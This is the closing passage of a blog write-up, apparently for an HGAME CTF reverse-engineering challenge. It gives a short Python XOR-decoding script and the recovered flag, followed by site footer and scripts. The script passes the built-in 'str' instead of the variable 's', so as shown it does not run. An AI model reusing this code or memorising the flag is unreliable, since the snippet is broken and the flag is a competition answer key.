<figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">'7d037d045717722d62114e6a5b044f2c184c3f44214c2d4a22'</span>)</span><br><span class="line">c = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">str</span>)</span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(c) - <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>):</span><br><span class="line">    c[i] ^= c[i - <span class="hljs-number">1</span>]</span><br><span class="line"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(c[::-<span class="hljs-number">1</span>]))</span><br></pre></td></tr></tbody></table></figure>

<p>输出flag</p>
<figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">hgame</span>{sT<span class="hljs-number">4</span>cK_<span class="hljs-number">1</span>$_sO_e@Sy~~}</span><br></pre></td></tr></tbody></table></figure>

</body></html>
    
    </div>
    
    <div class="columns is-variable is-1 is-multiline is-mobile">
    
        <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/writeup/">#writeup</a></span>
    
        <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/ctf/">#ctf</a></span>
    
        <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/re/">#re</a></span>
    
        <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/hgame/">#hgame</a></span>
    
    </div>
    
    
    <div class="columns is-mobile is-multiline article-nav">
        <span class="column is-12-mobile is-half-desktop  article-nav-prev">
            
            <a href="/2020/02/19/%E8%8A%B1%E6%8C%87%E4%BB%A4/">花指令</a>
            
        </span>
        <span class="column is-12-mobile is-half-desktop  article-nav-next">
            
            <a href="/2020/01/11/BUUCTF-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/">BUUCTF-re部分题解</a>
            
        </span>
    </div>
    
</article>


<div class="sharebox">
    
<div class="sharethis-inline-share-buttons"></div>
<script type='text/javascript' src='https://platform-api.sharethis.com/js/sharethis.js#property=618a5a31fe4ac40012aea77e&amp;product=inline-share-buttons' async='async'></script>

</div>



<div class="comments">
    <h3 class="title is-4">Comments</h3>
    
<script>
    var disqus_config = function () {
        this.page.url = 'http://blog.rycbar.club/2020/01/25/hgame-wp/';
        this.page.identifier = '2020/01/25/hgame-wp/';
        
        this.language = 'en';
        
    };
    (function() {
        var d = document, s = d.createElement('script');  
        s.src = '//' + 'rrblog-2' + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>

<div id="disqus_thread">
    
    <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
</div>
</div>

    </div>
</section>
    <footer class="footer">
    <div class="container">
        <div class="columns content">
            <div class="column is-narrow has-text-centered">
                &copy; 2021 Aorui Zhang&nbsp;
                Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a
                        target="_blank" rel="noopener" href="http://github.com/ppoffice/hexo-theme-minos">Minos</a>
            </div>
            <div class="column is-hidden-mobile"></div>

            
            <div class="column is-narrow">
                <div class="columns is-mobile is-multiline is-centered">
                
                    
                <a class="column is-narrow has-text-black" title="GitHub" target="_blank" rel="noopener" href="https://github.com/rycbar77">
                    
                    GitHub
                    
                </a>
                
                </div>
            </div>
            
            
        </div>
    </div>
</footer>
    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/moment.js/2.22.2/moment-with-locales.min.js"></script>

<!-- test if the browser is outdated -->
<div id="outdated">
    <h6>Your browser is out-of-date!</h6>
    <p>Update your browser to view this website correctly. <a id="btnUpdateBrowser" target="_blank" rel="noopener" href="http://outdatedbrowser.com/">Update my browser now </a></p>
    <p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">&times;</a></p>
</div>
<script src="//cdnjs.cloudflare.com/ajax/libs/outdated-browser/1.1.5/outdatedbrowser.min.js"></script>
<script>
    $(document).ready(function () {
        // plugin function, place inside DOM ready function
        outdatedBrowser({
            bgColor: '#f25648',
            color: '#ffffff',
            lowerThan: 'flex'
        })
    });
</script>

<script>
    window.FontAwesomeConfig = {
        searchPseudoElements: true
    }
    moment.locale("en-AU");
</script>


    
    
<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
<script>
    MathJax.Hub.Config({
        "HTML-CSS": {
            matchFontHeight: false
        },
        SVG: {
            matchFontHeight: false
        },
        CommonHTML: {
            matchFontHeight: false
        },
        tex2jax: {
            inlineMath: [
                ['$','$'],
                ['\\(','\\)']
            ]
        }
    });
</script>

    
    
    
    
<script src="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/js/lightgallery-all.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/justifiedGallery/3.6.5/js/jquery.justifiedGallery.min.js"></script>
<script>
    (function ($) {
        $(document).ready(function () {
            if (typeof($.fn.lightGallery) === 'function') {
                $('.article.gallery').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof($.fn.justifiedGallery) === 'function') {
                $('.justified-gallery').justifiedGallery();
            }
        });
    })(jQuery);
</script>

    
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
    <style>
        .hljs {
            position: relative;
        }

        .hljs .clipboard-btn {
            float: right;
            color: #9a9a9a;
            background: none;
            border: none;
            cursor: pointer;
        }

        .hljs .clipboard-btn:hover {
          color: #8a8a8a;
        }

        .hljs > .clipboard-btn {
            display: none;
            position: absolute;
            right: 4px;
            top: 4px;
        }

        .hljs:hover > .clipboard-btn {
            display: inline;
        }

        .hljs > figcaption > .clipboard-btn {
            margin-right: 4px;
        }
    </style>
    <script>
      $(document).ready(function () {
        $('figure.hljs').each(function(i, figure) {
          var codeId = 'code-' + i;
          var code = figure.querySelector('.code');
          var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
          code.id = codeId;
          copyButton.addClass('clipboard-btn');
          copyButton.attr('data-clipboard-target-id', codeId);

          var figcaption = figure.querySelector('figcaption');

          if (figcaption) {
            figcaption.append(copyButton[0]);
          } else {
            figure.prepend(copyButton[0]);
          }
        })

        var clipboard = new ClipboardJS('.clipboard-btn', {
          target: function(trigger) {
            return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
          }
        });
        clipboard.on('success', function(e) {
          e.clearSelection();
        })
      })
    </script>

    
    

    



<script src="/js/script.js"></script>


    
    <div class="searchbox ins-search">
    <div class="searchbox-mask"></div>
    <div class="searchbox-container ins-search-container">
        <div class="searchbox-input-wrapper">
            <input type="text" class="searchbox-input ins-search-input" placeholder="Type something..." />
            <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
        </div>
        <div class="searchbox-result-wrapper ins-section-wrapper">
            <div class="ins-section-container"></div>
        </div>
    </div>
</div>
<script>
    (function (window) {
        var INSIGHT_CONFIG = {
            TRANSLATION: {
                POSTS: 'Posts',
                PAGES: 'Pages',
                CATEGORIES: 'Categories',
                TAGS: 'Tags',
                UNTITLED: '(Untitled)',
            },
            CONTENT_URL: '/content.json',
        };
        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
    })(window);
</script>

<script src="/js/insight.js"></script>

    
</body>
</html>